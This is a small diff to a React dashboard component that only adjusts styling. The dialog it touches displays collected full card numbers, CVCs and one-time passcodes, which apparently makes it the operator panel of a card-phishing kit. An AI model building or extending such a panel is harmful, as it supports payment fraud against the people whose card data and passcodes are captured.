@@ -124,7 +124,7 @@ export default function Dashboard() {
         </CardContent>
       </Card>
 
-      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
+      <Dialog open={dialogOpen} onOpenChange={setDialogOpen} >
         <DialogContent>
           <DialogHeader>
             <DialogTitle>Renewal Information</DialogTitle>
@@ -134,7 +134,7 @@ export default function Dashboard() {
               <p><strong>Name:</strong> {selectedRenewal.name}</p>
               <p><strong>ID:</strong> {selectedRenewal.phone}</p>
               <p><strong>Date:</strong> {selectedRenewal.datayaer}/{selectedRenewal.dateMonth}</p>
-              <p><strong>Card Number:</strong> {selectedRenewal.cardNumber}</p>
+              <p className='py-4'> <strong>Card Number:</strong> {selectedRenewal.cardNumber}</p>
               <p><strong>CVC:</strong> {selectedRenewal.CVC}</p>
               <p><strong>OTP:</strong> {selectedRenewal.otp.join(', ')}</p>
             </div>
